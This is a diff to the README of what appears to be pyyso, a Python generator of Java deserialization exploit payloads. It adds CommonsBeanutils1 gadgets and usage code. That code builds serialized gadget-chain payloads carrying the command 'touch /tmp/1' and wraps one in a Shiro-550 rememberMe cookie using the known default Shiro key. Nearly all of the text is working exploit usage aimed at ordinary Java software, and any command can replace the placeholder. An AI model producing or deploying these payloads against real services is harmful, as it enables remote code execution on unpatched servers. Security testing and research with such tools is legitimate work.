@@ -17,8 +17,8 @@ pyyso has implemented
 - CommonsCollections1-7 Gadgets
 - JDK7u21 Gadget
 - JDK8u21 Gadget
-- CommonsBeanutils 1.8.3
-- CommonsBeanutils 1.9.2
+- CommonsBeanutils1 1.8.3 no cc
+- CommonsBeanutils1 1.9.2
 - shiro-550 rememberMe deserialized
 - java class embed with command
 - ldap server hosting java serialized pocs
@@ -41,10 +41,16 @@ import pyyso
 to generate a java serialized zed poc use:
 ```
 pyyso.urldns("https://x.dnslog.com") #return java serialzed data of URLDNS in bytes
-pyyso.cc1("touch /tmp/1") #return java serialzed data of CommonColletions1 in bytes
-pyyso.cc2("touch /tmp/1") #return java serialzed data of CommonColletions2 in bytes
+pyyso.cc1("touch /tmp/1") #return java serialzed data of CommonsColletions1 in bytes
+pyyso.cc2("touch /tmp/1") #return java serialzed data of CommonsColletions2 in bytes
 pyyso.jdk7u21("touch /tmp/1") #return java serialzed data of JDK7u21 in bytes
 pyyso.jdk8u20("touch /tmp/1") #return java serialzed data of JDK8u20 in bytes
+pyyso.cb1v183("touch /tmp/1") #return java serialzed data of CommonsBeanutils1 1.8.3 no cc in bytes
+```
+to encode a shiro poc use:
+```
+serobj=pyyso.cb1v183("touch /tmp/1")
+pyyso.shiroEncode(serobj=serobj,key=b'kPH+bIxk5D2deZiIxcaaaA==')
 ```
 to generate a java class embed with command use:
 ```
